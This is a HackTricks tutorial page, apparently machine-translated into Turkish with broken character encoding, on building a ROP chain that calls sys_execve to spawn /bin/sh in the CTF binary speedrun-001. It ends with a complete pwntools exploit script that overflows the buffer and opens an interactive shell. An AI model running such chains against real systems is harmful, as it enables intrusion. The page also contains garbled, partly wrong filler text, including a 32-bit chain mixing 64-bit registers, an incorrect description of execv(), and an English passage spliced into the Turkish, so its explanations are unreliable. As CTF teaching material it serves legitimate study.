# ROP - sys\_execve Ã§aÄŸrÄ±sÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

**Syscall** iÃ§in Ã§aÄŸrÄ±yÄ± hazÄ±rlamak iÃ§in aÅŸaÄŸÄ±daki yapÄ±landÄ±rmaya ihtiyaÃ§ vardÄ±r:

* `rax: 59 sys_execve'yi belirtir`
* `rdi: "/bin/sh" dosyasÄ±nÄ± belirtir`
* `rsi: 0 argÃ¼man geÃ§irilmediÄŸini belirtir`
* `rdx: 0 Ã§evre deÄŸiÅŸkeni geÃ§irilmediÄŸini belirtir`

Yani, temel olarak `/bin/sh` dizesini bir yere yazmak ve ardÄ±ndan `syscall` iÅŸlemini gerÃ§ekleÅŸtirmek gerekmektedir (yÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in gereken dolgu hakkÄ±nda bilinÃ§li olunmalÄ±dÄ±r).

## RegisterlarÄ± kontrol etmek

BaÅŸlayalÄ±m ve **bu registerlarÄ± nasÄ±l kontrol edeceÄŸimizi** bulalÄ±m:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Bu adreslerle, iÃ§eriÄŸi yÄ±ÄŸÄ±nda yazmak ve kaydetmek mÃ¼mkÃ¼ndÃ¼r.

## Dize yazma

### YazÄ±labilir bellek

Ã–ncelikle, bellekte yazÄ±labilir bir yer bulmanÄ±z gerekmektedir.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Dize Yaz

ArdÄ±ndan, bu adrese isteÄŸe baÄŸlÄ± iÃ§erik yazmak iÃ§in bir yol bulmanÄ±z gerekmektedir.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 bitlik sistemler

32 bitlik sistemlerde, ROP (Return Oriented Programming) kullanarak `execve` sistem Ã§aÄŸrÄ±sÄ±nÄ± gerÃ§ekleÅŸtirebiliriz. Bu, hedef sistemde yeni bir iÅŸlem baÅŸlatmamÄ±zÄ± saÄŸlar.

`execve` sistem Ã§aÄŸrÄ±sÄ±, bir programÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r. Ä°ÅŸletim sistemi, belirtilen programÄ± hedef sistemde Ã§alÄ±ÅŸtÄ±rÄ±r. Bu sistem Ã§aÄŸrÄ±sÄ±, `execve(const char *filename, char *const argv[], char *const envp[])` ÅŸeklinde tanÄ±mlanÄ±r.

ROP kullanarak `execve` sistem Ã§aÄŸrÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebiliriz:

1. Ä°ÅŸletim sistemi tarafÄ±ndan saÄŸlanan `execve` sistem Ã§aÄŸrÄ±sÄ±nÄ±n adresini bulun.
2. `execve` sistem Ã§aÄŸrÄ±sÄ±nÄ± gerÃ§ekleÅŸtirecek olan argÃ¼manlarÄ± hazÄ±rlayÄ±n.
3. ROP zinciri oluÅŸturun ve `execve` sistem Ã§aÄŸrÄ±sÄ±nÄ± tetikleyin.

Bu yÃ¶ntem, hedef sistemde yeni bir iÅŸlem baÅŸlatmak iÃ§in kullanÄ±labilir. Ancak, hedef sistemdeki gÃ¼venlik Ã¶nlemleri ve sistem yapÄ±landÄ±rmasÄ± bu yÃ¶ntemin etkinliÄŸini etkileyebilir.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bit

64 bit iÅŸletim sistemleri, 64 bitlik bellek adresleme yeteneÄŸine sahip olan iÅŸletim sistemleridir. Bu sistemler, daha bÃ¼yÃ¼k bellek alanlarÄ±na eriÅŸim saÄŸlayabilir ve daha karmaÅŸÄ±k hesaplama iÅŸlemlerini gerÃ§ekleÅŸtirebilir. 64 bitlik iÅŸletim sistemlerinde, bellek adresleri 64 bitlik sayÄ±larla temsil edilir.

#### ROP (Return-Oriented Programming)

ROP (Return-Oriented Programming), hedef bir programda bulunan mevcut kod parÃ§alarÄ±nÄ± kullanarak istenilen iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan bir saldÄ±rÄ± tekniÄŸidir. Bu teknik, hedef programÄ±n belleÄŸindeki mevcut kod parÃ§alarÄ±nÄ± birleÅŸtirerek yeni bir iÅŸlem dizisi oluÅŸturur. Bu iÅŸlem dizisi, hedef programÄ±n Ã§alÄ±ÅŸma akÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirerek istenilen iÅŸlemleri gerÃ§ekleÅŸtirir.

#### Syscall

Syscall (System Call), bir iÅŸletim sistemi hizmetine eriÅŸmek iÃ§in kullanÄ±lan bir arayÃ¼zdÃ¼r. Bir program, iÅŸletim sistemi hizmetlerine eriÅŸmek iÃ§in syscall komutunu kullanÄ±r. Syscall komutu, iÅŸletim sistemiyle iletiÅŸim kurarak belirli bir hizmeti gerÃ§ekleÅŸtirir. Ã–rneÄŸin, dosya okuma veya yazma gibi iÅŸlemler iÃ§in syscall komutu kullanÄ±lÄ±r.

#### execv()

execv() fonksiyonu, bir programÄ±n baÅŸka bir programÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlayan bir C dilindeki iÅŸlevdir. Bu fonksiyon, bir programÄ±n belleÄŸindeki mevcut kod parÃ§alarÄ±nÄ± kullanarak baÅŸka bir programÄ± Ã§alÄ±ÅŸtÄ±rÄ±r. execv() fonksiyonu, hedef programÄ±n Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ±n yolunu ve argÃ¼manlarÄ±nÄ± alÄ±r ve hedef programÄ± Ã§alÄ±ÅŸtÄ±rÄ±r.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Ã–rnek

Let's consider a simple example to understand how to use ROP to execute a `execve` syscall in Linux.

Linux systems use the `execve` syscall to execute a new program. This syscall takes three arguments: the path to the program, an array of command-line arguments, and an array of environment variables.

To execute a `execve` syscall using ROP, we need to find the addresses of the necessary gadgets and the addresses of the strings we want to pass as arguments.

First, we need to find a gadget that will load the address of the `execve` syscall into a register. We can use the `pop rax; ret` gadget to load the syscall number into the `rax` register.

Next, we need to find gadgets that will load the arguments for the `execve` syscall into the appropriate registers. We can use gadgets like `pop rdi; ret` to load the path to the program into the `rdi` register, `pop rsi; ret` to load the address of the command-line arguments array into the `rsi` register, and `pop rdx; ret` to load the address of the environment variables array into the `rdx` register.

Finally, we need to find a gadget that will trigger the `execve` syscall. We can use the `syscall; ret` gadget to trigger the syscall.

Once we have the addresses of these gadgets and the addresses of the strings we want to pass as arguments, we can construct our ROP chain. The ROP chain will consist of the addresses of the gadgets followed by the addresses of the strings.

When the ROP chain is executed, it will load the necessary values into the appropriate registers and trigger the `execve` syscall, executing the specified program with the specified arguments and environment variables.

This is just a basic example of how to use ROP to execute a `execve` syscall in Linux. ROP can be used for much more complex tasks, such as bypassing security mechanisms or escalating privileges.
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Referanslar

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
